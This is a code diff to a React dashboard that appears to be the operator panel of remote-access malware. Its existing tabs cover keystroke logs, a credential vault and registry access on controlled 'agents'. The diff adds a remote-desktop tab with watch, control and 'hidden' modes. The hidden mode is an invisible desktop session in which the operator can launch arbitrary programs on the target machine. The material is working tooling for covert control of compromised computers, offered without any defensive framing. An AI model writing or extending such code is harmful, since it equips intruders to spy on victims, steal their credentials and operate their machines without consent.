@@ -122,6 +122,7 @@ const TABS = [
   { key: 'files', icon: '📁', label: 'Files' },
   { key: 'processes', icon: '⚙', label: 'Processes' },
   { key: 'display', icon: '🖥', label: 'Display' },
+  { key: 'remote', icon: '🖥', label: 'Remote' },
   { key: 'keylog', icon: '⌨', label: 'Input Log' },
   { key: 'vault', icon: '🔑', label: 'Vault' },
   { key: 'registry', icon: '🗂', label: 'Registry' },
@@ -224,6 +225,7 @@ export default function AgentModal({ agent, onClose }) {
         {tab === 'files' && <FilesTab agentId={agent.id} showToast={showToast} isMobile={isMobile} />}
         {tab === 'processes' && <ProcessesTab agentId={agent.id} showToast={showToast} isMobile={isMobile} />}
         {tab === 'display' && <DisplayTab agentId={agent.id} showToast={showToast} />}
+        {tab === 'remote' && <RemoteDesktopTab agent={agent} showToast={showToast} />}
         {tab === 'keylog' && <InputLogTab agentId={agent.id} showToast={showToast} />}
         {tab === 'vault' && <VaultTab creds={creds} agentId={agent.id} showToast={showToast} isMobile={isMobile} />}
         {tab === 'registry' && <RegistryTab agentId={agent.id} showToast={showToast} isMobile={isMobile} />}
@@ -719,6 +721,267 @@ function DisplayTab({ agentId, showToast }) {
           <div key={i} style={{ width: 120, height: 72, background: '#15171b', border: '1px solid var(--border)', display: 'flex', alignItems: 'center', justifyContent: 'center', color: 'rgba(255,255,255,0.3)', fontSize: 10, fontFamily: 'var(--font-mono)', flexShrink: 0 }}>EMPTY</div>
         ))}
       </div>
+    </div>
+  );
+}
+
+/* ========== REMOTE DESKTOP TAB ========== */
+function RemoteDesktopTab({ agent, showToast }) {
+  const [mode, setMode] = useState('watch');
+  const [session, setSession] = useState(null);
+  const [connected, setConnected] = useState(false);
+  const [fps, setFps] = useState(0);
+  const [error, setError] = useState(null);
+  const canvasRef = useRef(null);
+  const wsRef = useRef(null);
+  const frameCount = useRef(0);
+  const containerRef = useRef(null);
+
+  const startSession = async () => {
+    setError(null);
+    try {
+      // Create VNC session via API
+      const res = await api.vncStart(agent.id, mode);
+      const sessionId = res.session_id;
+      setSession(res);
+
+      // Send task to agent to start streaming
+      await api.createTask(agent.id, 'remote_desktop_start', {
+        mode: mode,
+        session_id: sessionId,
+        _server_url: window.location.origin,
+      });
+
+      // Connect panel WebSocket after a short delay for agent to connect
+      setTimeout(() => {
+        const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+        const token = localStorage.getItem('sg_token');
+        const ws = new WebSocket(`${proto}//${window.location.host}/api/v1/vnc/panel?session_id=${sessionId}&token=${token}`);
+        wsRef.current = ws;
+
+        ws.onopen = () => {
+          setConnected(true);
+          showToast('🖥 Remote desktop connected');
+        };
+
+        ws.onclose = () => {
+          setConnected(false);
+        };
+
+        ws.onerror = () => {
+          setError('WebSocket connection failed');
+          setConnected(false);
+        };
+
+        ws.onmessage = (e) => {
+          try {
+            const data = JSON.parse(e.data);
+            if (data.type === 'frame' && data.data) {
+              const img = new Image();
+              img.onload = () => {
+                const canvas = canvasRef.current;
+                if (canvas) {
+                  canvas.width = data.width || img.width;
+                  canvas.height = data.height || img.height;
+                  const ctx = canvas.getContext('2d');
+                  ctx.drawImage(img, 0, 0);
+                }
+              };
+              img.src = 'data:image/bmp;base64,' + data.data;
+              frameCount.current++;
+            }
+          } catch {}
+        };
+      }, 2000);
+    } catch (e) {
+      setError(e.message || 'Failed to start session');
+    }
+  };
+
+  const stopSession = async () => {
+    if (wsRef.current) {
+      try {
+        wsRef.current.send(JSON.stringify({ type: 'stop' }));
+      } catch {}
+      wsRef.current.close();
+      wsRef.current = null;
+    }
+    if (session?.session_id) {
+      try {
+        await api.vncStop(session.session_id);
+      } catch {}
+      try {
+        await api.createTask(agent.id, 'remote_desktop_stop', {});
+      } catch {}
+    }
+    setSession(null);
+    setConnected(false);
+    setFps(0);
+    frameCount.current = 0;
+  };
+
+  // Mouse handler for control/hidden mode
+  const handleCanvasClick = (e) => {
+    if (mode === 'watch' || !wsRef.current || wsRef.current.readyState !== 1) return;
+    const canvas = canvasRef.current;
+    if (!canvas) return;
+    const rect = canvas.getBoundingClientRect();
+    const scaleX = canvas.width / rect.width;
+    const scaleY = canvas.height / rect.height;
+    const x = Math.round((e.clientX - rect.left) * scaleX);
+    const y = Math.round((e.clientY - rect.top) * scaleY);
+    wsRef.current.send(JSON.stringify({
+      type: 'mouse', x, y, button: e.button === 2 ? 'right' : 'left', action: 'click'
+    }));
+  };
+
+  const handleMouseMove = (e) => {
+    if (mode === 'watch' || !wsRef.current || wsRef.current.readyState !== 1) return;
+    if (e.buttons === 0) return;
+    const canvas = canvasRef.current;
+    if (!canvas) return;
+    const rect = canvas.getBoundingClientRect();
+    const scaleX = canvas.width / rect.width;
+    const scaleY = canvas.height / rect.height;
+    const x = Math.round((e.clientX - rect.left) * scaleX);
+    const y = Math.round((e.clientY - rect.top) * scaleY);
+    wsRef.current.send(JSON.stringify({
+      type: 'mouse', x, y, button: 'left', action: 'move'
+    }));
+  };
+
+  // Keyboard handler for control/hidden mode
+  useEffect(() => {
+    if (mode === 'watch' || !connected) return;
+    const handleKey = (e) => {
+      if (!containerRef.current || !containerRef.current.contains(document.activeElement)) return;
+      e.preventDefault();
+      e.stopPropagation();
+      if (wsRef.current && wsRef.current.readyState === 1) {
+        wsRef.current.send(JSON.stringify({
+          type: 'key', vk: e.keyCode, action: e.type === 'keydown' ? 'down' : 'up'
+        }));
+      }
+    };
+    document.addEventListener('keydown', handleKey, true);
+    document.addEventListener('keyup', handleKey, true);
+    return () => {
+      document.removeEventListener('keydown', handleKey, true);
+      document.removeEventListener('keyup', handleKey, true);
+    };
+  }, [mode, connected]);
+
+  // FPS counter
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setFps(frameCount.current);
+      frameCount.current = 0;
+    }, 1000);
+    return () => clearInterval(interval);
+  }, []);
+
+  // Cleanup on unmount
+  useEffect(() => {
+    return () => {
+      if (wsRef.current) {
+        wsRef.current.close();
+        wsRef.current = null;
+      }
+    };
+  }, []);
+
+  return (
+    <div ref={containerRef} tabIndex={0} style={{ display: 'flex', flexDirection: 'column', flex: 1, background: '#0a0c10', outline: 'none' }}>
+      {/* Toolbar */}
+      <div style={S.toolbar}>
+        <div style={{ display: 'flex', gap: 4 }}>
+          {['watch', 'control', 'hidden'].map(m => (
+            <button key={m} onClick={() => setMode(m)} disabled={connected}
+              style={{ ...S.toolBtn, ...(mode === m ? { background: 'rgba(0,255,136,0.15)', borderColor: 'var(--green)', color: 'var(--green)' } : {}) }}>
+              {m === 'watch' ? '👁 Watch' : m === 'control' ? '🖱 Control' : '🕶 Hidden'}
+            </button>
+          ))}
+        </div>
+        <div style={{ flex: 1 }} />
+        {connected && (
+          <span style={{ color: 'var(--green)', fontSize: 10, fontFamily: 'var(--font-mono)', display: 'flex', alignItems: 'center', gap: 6 }}>
+            <span style={{ width: 6, height: 6, background: 'var(--green)', display: 'inline-block', animation: 'pulse 2s infinite' }} />
+            LIVE {fps} FPS
+          </span>
+        )}
+        {error && <span style={{ color: 'var(--red)', fontSize: 10, fontFamily: 'var(--font-mono)' }}>✕ {error}</span>}
+        {!connected ? (
+          <button style={{ ...S.toolBtn, ...S.btnSuccess }} onClick={startSession}>▶ START</button>
+        ) : (
+          <button style={{ ...S.toolBtn, ...S.btnDanger }} onClick={stopSession}>■ STOP</button>
+        )}
+        {mode === 'hidden' && connected && (
+          <button style={S.toolBtn} onClick={() => {
+            const cmd = prompt('Run application on hidden desktop:');
+            if (cmd && wsRef.current && wsRef.current.readyState === 1) {
+              wsRef.current.send(JSON.stringify({ type: 'run', cmd }));
+              showToast('▶ Launched on hidden desktop');
+            }
+          }}>▶ Run App</button>
+        )}
+      </div>
+
+      {/* Canvas area */}
+      <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', overflow: 'auto', padding: 8 }}>
+        {connected ? (
+          <canvas
+            ref={canvasRef}
+            onClick={handleCanvasClick}
+            onMouseMove={handleMouseMove}
+            onContextMenu={(e) => {
+              e.preventDefault();
+              if (mode !== 'watch' && wsRef.current && wsRef.current.readyState === 1) {
+                const canvas = canvasRef.current;
+                if (!canvas) return;
+                const rect = canvas.getBoundingClientRect();
+                const scaleX = canvas.width / rect.width;
+                const scaleY = canvas.height / rect.height;
+                wsRef.current.send(JSON.stringify({
+                  type: 'mouse',
+                  x: Math.round((e.clientX - rect.left) * scaleX),
+                  y: Math.round((e.clientY - rect.top) * scaleY),
+                  button: 'right', action: 'click'
+                }));
+              }
+            }}
+            style={{
+              maxWidth: '100%', maxHeight: '100%',
+              cursor: mode === 'watch' ? 'default' : 'crosshair',
+              border: '1px solid var(--border)',
+              background: '#000',
+            }}
+          />
+        ) : (
+          <div style={{ textAlign: 'center', color: 'rgba(255,255,255,0.3)', fontFamily: 'var(--font-mono)' }}>
+            <div style={{ fontSize: 48, marginBottom: 16, opacity: 0.4 }}>🖥</div>
+            <div style={{ fontSize: 14, marginBottom: 8 }}>Select mode and click START</div>
+            <div style={{ fontSize: 10, maxWidth: 420, lineHeight: 1.6, color: 'rgba(255,255,255,0.2)' }}>
+              <span style={{ color: 'rgba(255,255,255,0.4)' }}>👁 Watch</span> — view screen live &nbsp;│&nbsp;
+              <span style={{ color: 'rgba(255,255,255,0.4)' }}>🖱 Control</span> — mouse + keyboard &nbsp;│&nbsp;
+              <span style={{ color: 'rgba(255,255,255,0.4)' }}>🕶 Hidden</span> — invisible desktop session
+            </div>
+          </div>
+        )}
+      </div>
+
+      {/* Status bar */}
+      {connected && (
+        <div style={{
+          display: 'flex', alignItems: 'center', gap: 16, padding: '4px 12px',
+          borderTop: '1px solid var(--border)', background: '#1f2228', fontSize: 10,
+          fontFamily: 'var(--font-mono)', color: 'rgba(255,255,255,0.4)', flexShrink: 0,
+        }}>
+          <span>MODE: <span style={{ color: mode === 'hidden' ? 'var(--yellow)' : 'var(--green)' }}>{mode.toUpperCase()}</span></span>
+          <span>SESSION: <span style={{ color: 'var(--green)' }}>{session?.session_id || '-'}</span></span>
+          <span>FPS: <span style={{ color: fps > 0 ? 'var(--green)' : 'var(--red)' }}>{fps}</span></span>
+          {mode !== 'watch' && <span style={{ color: 'var(--yellow)' }}>⚡ Click canvas to focus input</span>}
+        </div>
+      )}
     </div>
   );
 }
